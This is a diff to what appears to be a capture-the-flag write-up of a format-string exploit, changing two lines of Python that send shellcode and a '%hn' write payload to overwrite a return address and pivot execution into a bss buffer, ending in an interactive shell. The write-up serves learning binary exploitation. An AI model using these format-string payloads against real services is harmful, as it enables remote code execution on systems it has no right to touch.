@@ -78,7 +78,7 @@ To be safe we assume there is aslr enabled on the server. We also need to utiliz
 So now we have a pointer to the location of the return address, so we simply need to wrap around to that pointer and write to it. We wrap around to our written address and overwrite the previous return address, and have it point to our buffer in the bss. Also we know that on our text segment and bss segment starts with 0x0804 which is why we can have it pivot to the buffer by writing only the size of a *short*.
 >```python
 >lower = bufaddr&0xffff
->r.send(shellcode+'%.'+str(lower-len(shellcode))+'u%12$hn\n')
+>r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))
 >```
 
 Putting it together:
@@ -103,7 +103,7 @@ addr = addr&0xFFFF
 
 r.send('%.{0!s}u%4$hn\n'.format(addr))
 lower = bufaddr&0xffff
-r.send(shellcode+'%.'+str(lower-len(shellcode))+'u%12$hn\n')
+r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))
 
 r.interactive()
 ```
